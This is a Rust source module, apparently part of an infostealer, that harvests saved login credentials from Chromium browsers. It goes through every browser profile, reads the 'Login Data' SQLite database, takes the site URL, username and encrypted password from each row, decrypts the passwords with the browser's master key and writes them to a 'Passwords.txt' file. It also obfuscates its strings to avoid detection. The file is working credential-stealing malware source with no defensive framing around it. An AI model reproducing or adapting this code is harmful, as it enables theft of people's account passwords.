use sqlite::DatabaseReader;
use alloc::borrow::ToOwned;
use alloc::boxed::Box;
use alloc::string::{String, ToString};
use alloc::sync::Arc;
use alloc::vec::Vec;
use sqlite::{read_sqlite3_database_by_bytes, TableRecord, TableRecordExtension};
use tasks::{parent_name, Task};
use utils::path::{Path, WriteToFile};
use crate::chromium::Browser;
use crate::{collect_from_all_profiles, read_sqlite3_and_map_records, to_string_and_write_all, Password};
use obfstr::obfstr as s;
use utils::browsers::chromium::decrypt_data;

const LOGINS_ORIGIN_URL: usize = 0;
const LOGINS_USERNAME_VALUE: usize = 3;
const LOGINS_PASSWORD_VALUE: usize = 5;

pub(super) struct PasswordsTask {
    browser: Arc<Browser>
}

impl PasswordsTask {
    pub(super) fn new(browser: Arc<Browser>) -> Self {
        Self { browser }
    }
}

impl Task for PasswordsTask {
    parent_name!("Passwords.txt");

    unsafe fn run(&self, parent: &Path) {
        let Some(passwords) = collect_from_all_profiles(
            &self.browser.profiles,
            |profile| get_passwords(profile, &self.browser.master_key)
        ) else {
            return
        };

        let _ = to_string_and_write_all(&passwords, "\n\n", parent);
    }
}

fn get_passwords(profile: &Path, master_key: &[u8]) -> Option<Vec<Password>> {
    let login_data = profile / s!("Login Data");
    
    read_sqlite3_and_map_records(
        &login_data,
        s!("Logins"),
        |record| extract_password_from_record(record, master_key)
    )
}

fn extract_password_from_record(record: &Box<dyn TableRecord>, master_key: &[u8]) -> Option<Password> {
    let origin = record
        .get_value(LOGINS_ORIGIN_URL)
        .and_then(|value| value.as_string())
        .map(|s| s.to_owned());

    let username = record
        .get_value(LOGINS_USERNAME_VALUE)
        .and_then(|value| value.as_string())
        .map(|s| s.to_owned());

    let password = record
        .get_value(LOGINS_PASSWORD_VALUE)
        .and_then(|value| value.as_blob())
        .and_then(|blob| unsafe { decrypt_data(blob, master_key) });

    if let (None, None) = (&username, &password) {
        return None
    }

    Some(Password {
        origin,
        username,
        password
    })
}